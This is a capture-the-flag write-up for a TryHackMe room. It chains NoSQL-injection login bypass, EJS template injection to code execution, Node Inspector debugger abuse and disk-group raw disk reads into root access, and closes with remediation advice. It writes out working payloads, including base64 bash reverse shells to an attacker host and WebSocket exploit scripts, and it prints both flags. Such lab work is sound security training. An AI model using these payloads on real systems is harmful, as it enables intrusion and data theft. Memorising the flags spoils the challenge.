# TryHackMe — Do Not Disturb (Hacker Holidays 2026, Day 7)

**Category:** Boot2Root — Web Exploitation
**Difficulty:** Medium
**Points:** 90

## Briefing

> Sign's on the door. Room's active. You have access you were never given, and so does he.
> The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets. Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.

**Target:** `10.114.172.199` (IP rotated during the room to `10.114.164.90` and later `10.114.173.16` — TryHackMe lab IP changes are common on timeout/restart)

---

## Flags

| Flag | Value |
|---|---|
| User | `THM{w4rm_s3ss10n_h1j4ck3d}` |
| Root | `THM{r4w_d1sk_4cc3ss_w4s_t00_much}` |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -sC -sV -p- 10.114.172.199
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    Node.js (Express middleware)
|_http-title: Byte Lotus — Poolside
```

Only SSH and a Node.js/Express web app were exposed. No valid SSH credentials were available, so all initial focus went to port 80.

### 1.2 Content Discovery

```bash
feroxbuster -u http://10.114.172.199 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x js,json
```

```
302      GET   /logout  => /
200      GET   /
403      GET   /staff
```

`/staff` existed but returned `403 Forbidden`. A follow-up `feroxbuster` scan scoped to `/staff` found no further sub-paths, and header manipulation (`X-Forwarded-For: 127.0.0.1`) did not bypass the restriction — this pointed to an **application-level (session-based) access control** rather than a path/IP-based one.

### 1.3 Reviewing the Login Page

```bash
curl -s http://10.114.172.199/ -o home.html
```

```html
<form method="post" action="/login">
  <input name="username" placeholder="attendant">
  <input name="password" type="password">
</form>
```

Simple server-rendered form, `POST /login`, no client-side JS to analyze.

---

## 2. Authentication Bypass — NoSQL Injection

### 2.1 Baseline Behavior

```bash
curl -i -X POST http://10.114.172.199/login -d "username=attendant&password=attendant"
```

Result: `401 Unauthorized`, `"Invalid credentials."`

### 2.2 Injection

Node/Express apps frequently sit on NoSQL datastores (MongoDB, NeDB, etc.). Sending the password as a JSON **object** rather than a string lets an operator like `$ne` (not-equal) manipulate the query instead of being treated as a literal value:

```bash
curl -i -X POST http://10.114.172.199/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attendant","password":{"$ne":null}}'
```

```
HTTP/1.1 200 OK
Set-Cookie: connect.sid=s%3AaCOdu8I_1WTch531FNoWOjbCUXZaSJ2T...
{"ok":true,"role":"staff"}
```

**Root cause (confirmed later from source — see §5):**

```js
const user = await db.findOneAsync({ username, password });
```

No type validation was performed on `req.body.password`. Passing an object instead of a string lets the query operator reach the datastore directly, matching any document where `password` is not `null` — i.e., any valid user.

---

## 3. Accessing the Protected `/staff` Resource

```bash
curl -i -b "connect.sid=<cookie>" http://10.114.172.199/staff
```

Returned `200 OK` with a staff console:

```html
<h1>Cabana Desk</h1>
<p>Signed in as <strong>attendant</strong>.</p>
<form method="post" action="/staff/preview">
  <textarea name="template">Dear &lt;%= guest %&gt;, your Byte Lotus cabana is confirmed.</textarea>
</form>
```

The form explicitly documents that the `template` field is rendered as **EJS** — a strong signal for Server-Side Template Injection (SSTI).

---

## 4. Server-Side Template Injection → RCE

### 4.1 Confirming SSTI

```bash
curl -s -X POST http://10.114.172.199/staff/preview \
  -b "connect.sid=<cookie>" \
  --data-urlencode "guest=test" \
  --data-urlencode "template=<%= 7*7 %>"
```

Response contained `<pre>49</pre>` — the expression was evaluated, not just echoed. SSTI confirmed.

### 4.2 Escalating to Code Execution

EJS's `<%= %>` tags execute arbitrary JavaScript expressions. Probing for a path to Node's module system:

```bash
# 1. Is `process` reachable?
--data-urlencode "template=<%= typeof process %>"        # → "object"

# 2. Is `process.mainModule` reachable?
--data-urlencode "template=<%= typeof process.mainModule %>"   # → "object"

# 3. Does it expose `require`?
--data-urlencode "template=<%= typeof process.mainModule.require %>"   # → "function"
```

With `require` reachable via `process.mainModule`, full RCE was possible:

```bash
curl -s -X POST http://10.114.172.199/staff/preview \
  -b "connect.sid=<cookie>" \
  --data-urlencode "guest=test" \
  --data-urlencode "template=<%= process.mainModule.require('child_process').execSync('id').toString() %>"
```

```
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

RCE achieved as `poolside`.

---

## 5. Reverse Shell & User Flag

### 5.1 Listener

```bash
nc -lvnp 4444
```

### 5.2 Base64-Encoded Payload

Shell metacharacters (`&`, `>`, `|`) don't survive URL/curl encoding cleanly, so the reverse shell command is base64-encoded and decoded server-side:

```bash
echo -n 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64 -w0
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzMC4xMDAvNDQ0NCAwPiYx
```

### 5.3 Trigger via SSTI

```bash
curl -s -X POST http://10.114.172.199/staff/preview \
  -b "connect.sid=<cookie>" \
  --data-urlencode "guest=test" \
  --data-urlencode "template=<%= process.mainModule.require('child_process').execSync('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzMC4xMDAvNDQ0NCAwPiYx | base64 -d | bash').toString() %>"
```

Shell received:

```
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 52178
poolside@tryhackme-2404:/opt/poolside$
```

### 5.4 TTY Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 5.5 Reading the Source

```bash
cat /opt/poolside/app.js
```

Confirmed the NoSQL-injectable auth handler and the unsanitized `ejs.render(req.body.template, ...)` call powering `/staff/preview`:

```js
app.post('/staff/preview', requireStaff, (req, res) => {
  const template = req.body.template || '';
  let rendered;
  try {
    rendered = ejs.render(template, { guest: req.session.user.username, hotel: 'Byte Lotus' });
  } catch (e) {
    rendered = 'Template error: ' + e.message;
  }
  res.send(staffDash(req.session.user.username, rendered, template));
});
```

### 5.6 User Flag

```bash
cat /home/*/user.txt
```

```
THM{w4rm_s3ss10n_h1j4ck3d}
```

---

## 6. Privilege Escalation Enumeration

Standard checks came up empty:

```bash
find / -perm -4000 2>/dev/null     # only stock SUID binaries
cat /etc/crontab                    # default jobs only
ls -la /etc/cron.d/                 # default jobs only
```

Checking `/home` revealed a second service account:

```bash
ls -la /home/
```

```
pipelinesvc  pipelinesvc
poolside     poolside
ubuntu       ubuntu
```

`pipelinesvc` stood out — the name strongly suggests an automated/CI service.

```bash
find / -iname "*pipeline*" 2>/dev/null
```

```
/opt/pipelinesvc/telemetry/processor.js
/opt/pipelinesvc/telemetry/package.json
```

Checking what's actually running:

```bash
ps aux | grep -i node
```

```
pipelin+  603  /usr/bin/node --inspect=127.0.0.1:9229 processor.js
poolside  604  /usr/bin/node app.js
```

**Critical finding:** a Node process is running as `pipelinesvc` with the **Node Inspector/Debugger** (`--inspect`) bound to `127.0.0.1:9229`.

```bash
systemctl list-units --type=service --all | grep -i telemetry
cat /etc/systemd/system/*.service | grep -A5 pipeline
```

```
lotus-telemetry.service   active   running
User=pipelinesvc
Group=pipelinesvc
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

This is a persistent systemd service deployed with the debugger flag left on — a classic misconfiguration, since the Node Inspector protocol allows arbitrary JavaScript execution in the target process.

---

## 7. Node Inspector Exploitation → `pipelinesvc`

### 7.1 Locate the Debugger Endpoint

```bash
curl -s http://127.0.0.1:9229/json
```

```json
[{
  "title": "processor.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/52a00bf9-f514-4e04-b193-0e61556716c7"
}]
```

### 7.2 Exploit via Chrome DevTools Protocol (`Runtime.evaluate`)

No `ws`/`websocket` libraries were installed, but Node v22's built-in global `WebSocket` client was sufficient:

```bash
cat << 'EOF' > /tmp/exploit.js
const ws = new WebSocket('ws://127.0.0.1:9229/52a00bf9-f514-4e04-b193-0e61556716c7');

ws.onopen = () => {
  ws.send(JSON.stringify({
    id: 1,
    method: 'Runtime.evaluate',
    params: {
      expression: "process.mainModule.require('child_process').execSync('id').toString()"
    }
  }));
};

ws.onmessage = (event) => {
  console.log('RESPONSE:', event.data);
  process.exit(0);
};

setTimeout(() => { process.exit(1); }, 5000);
EOF
node /tmp/exploit.js
```

```
RESPONSE: {"result":{"result":{"value":"uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)\n"}}}
```

RCE achieved as `pipelinesvc` — and critically, this account is a member of the **`disk`** group.

(Note: a bare `require(...)` is undefined in the Inspector's `Runtime.evaluate` global context — the same `process.mainModule.require` trick from the SSTI stage was needed again.)

### 7.3 Reverse Shell as `pipelinesvc`

```bash
# listener
nc -lvnp 4445

# payload
echo -n 'bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1' | base64 -w0
```

```bash
cat << 'EOF' > /tmp/exploit2.js
const ws = new WebSocket('ws://127.0.0.1:9229/52a00bf9-f514-4e04-b193-0e61556716c7');
ws.onopen = () => {
  ws.send(JSON.stringify({
    id: 1,
    method: 'Runtime.evaluate',
    params: {
      expression: "process.mainModule.require('child_process').execSync('echo <BASE64> | base64 -d | bash')"
    }
  }));
};
ws.onmessage = (e) => { console.log(e.data); process.exit(0); };
setTimeout(() => process.exit(1), 5000);
EOF
node /tmp/exploit2.js
```

```
pipelinesvc@tryhackme-2404:/opt/pipelinesvc/telemetry$
```

---

## 8. Root Flag — `disk` Group → Raw Disk Access

Membership in the `disk` group grants read access to raw block devices, bypassing all filesystem permissions.

```bash
lsblk
```

```
nvme0n1     20G disk
└─nvme0n1p1 20G part /
```

```bash
debugfs /dev/nvme0n1p1
```

Inside the `debugfs` prompt (reads the filesystem directly, no mount or permission checks required):

```
debugfs: cat /root/root.txt
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

---

## Attack Chain Summary

```
Web recon (nmap, feroxbuster)
        │
        ▼
NoSQL injection → bypass /login auth → staff session
        │
        ▼
SSTI in /staff/preview (EJS) → RCE as poolside
        │
        ▼
user.txt  ──────────────────────────► USER FLAG
        │
        ▼
Enumerate running processes → find --inspect debugger
on lotus-telemetry.service (runs as pipelinesvc)
        │
        ▼
Node Inspector WebSocket (Runtime.evaluate) → RCE as pipelinesvc
        │
        ▼
pipelinesvc is in the `disk` group
        │
        ▼
debugfs raw disk read → /root/root.txt ──────► ROOT FLAG
```

## Vulnerabilities Identified

| # | Vulnerability | Location | Impact |
|---|---|---|---|
| 1 | NoSQL Injection | `POST /login` (missing type validation on `password`) | Authentication bypass |
| 2 | Server-Side Template Injection | `POST /staff/preview` (`ejs.render()` on user input) | Remote Code Execution |
| 3 | Exposed debug interface | `lotus-telemetry.service` running with `--inspect` | Remote Code Execution as secondary service account |
| 4 | Excessive group privilege | `pipelinesvc` in `disk` group | Full filesystem read bypassing all permissions (→ root) |

## Remediation Notes

1. **Validate and type-check all user input** before passing it into database queries — reject non-primitive types for fields like `password`.
2. **Never render user-supplied strings as template source.** Treat `template` as *data* passed into a fixed, trusted template — never as the template itself.
3. **Never run production services with `--inspect`/`--inspect-brk`.** The debugger protocol grants arbitrary code execution to anything that can reach it.
4. **Audit group memberships for service accounts.** Groups like `disk`, `docker`, and `lxd` are root-equivalent in practice and should never be assigned to low-privilege or automated service users without strong justification.

---

*Writeup completed as part of TryHackMe Hacker Holidays 2026 — Day 7: Do Not Disturb.*
